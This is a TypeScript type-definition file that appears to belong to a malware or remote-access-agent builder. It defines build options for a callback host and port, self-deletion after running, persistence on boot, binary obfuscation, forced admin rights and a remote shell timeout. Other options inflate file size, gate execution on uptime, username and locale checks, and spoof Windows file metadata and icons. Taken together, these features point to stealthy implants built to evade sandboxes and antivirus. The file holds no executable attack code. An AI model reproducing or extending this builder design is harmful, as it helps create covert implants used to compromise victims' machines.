import type { AgentModuleId } from '../modules';

export const TARGET_OS_VALUES = ["windows", "linux", "darwin"] as const;
export type TargetOS = (typeof TARGET_OS_VALUES)[number];

export type TargetArch = "amd64" | "386" | "arm64";

export const TARGET_ARCHITECTURES_BY_OS: Record<
  TargetOS,
  readonly TargetArch[]
> = {
  windows: ["amd64", "386", "arm64"] as const,
  linux: ["amd64", "arm64"] as const,
  darwin: ["amd64", "arm64"] as const,
};

export const ALLOWED_EXTENSIONS_BY_OS: Record<TargetOS, readonly string[]> = {
  windows: [".exe", ".bat"] as const,
  linux: [".bin"] as const,
  darwin: [".bin"] as const,
};

export type NumericString = string | number;

export type CustomHeader = {
  key: string;
  value: string;
};

export type CustomCookie = {
  name: string;
  value: string;
};

export type AudioBuildOptions = {
  streaming?: boolean;
};

export type WatchdogSettings = {
  enabled: boolean;
  intervalSeconds: number;
};

export type FilePumperSettings = {
  enabled: boolean;
  targetBytes: number;
};

export type ExecutionTriggers = {
  delaySeconds?: number;
  minUptimeMinutes?: number;
  allowedUsernames?: string[];
  allowedLocales?: string[];
  requireInternet?: boolean;
  startTime?: string;
  endTime?: string;
};

export type FileIcon = {
  name?: string | null;
  data: string;
};

export type WindowsFileInformation = {
  fileDescription?: string;
  productName?: string;
  companyName?: string;
  productVersion?: string;
  fileVersion?: string;
  originalFilename?: string;
  internalName?: string;
  legalCopyright?: string;
};

export type BuildRequest = {
  host: string | number;
  port?: NumericString;
  outputFilename?: string;
  outputExtension?: string;
  targetOS?: TargetOS;
  targetArch?: TargetArch;
  installationPath?: string;
  meltAfterRun?: boolean;
  startupOnBoot?: boolean;
  developerMode?: boolean;
  mutexName?: string;
  compressBinary?: boolean;
  obfuscateBinary?: boolean;
  forceAdmin?: boolean;
  pollIntervalMs?: NumericString;
  maxBackoffMs?: NumericString;
  shellTimeoutSeconds?: NumericString;
  watchdog?: WatchdogSettings;
  filePumper?: FilePumperSettings;
  executionTriggers?: ExecutionTriggers;
  customHeaders?: CustomHeader[];
  customCookies?: CustomCookie[];
  audio?: AudioBuildOptions;
  fileIcon?: FileIcon;
  fileInformation?: WindowsFileInformation;
  modules?: AgentModuleId[];
};

export type BuildResponse = {
  success: boolean;
  message: string;
  outputPath?: string;
  downloadUrl?: string;
  log?: string[];
  sharedSecret?: string;
  warnings?: string[];
};
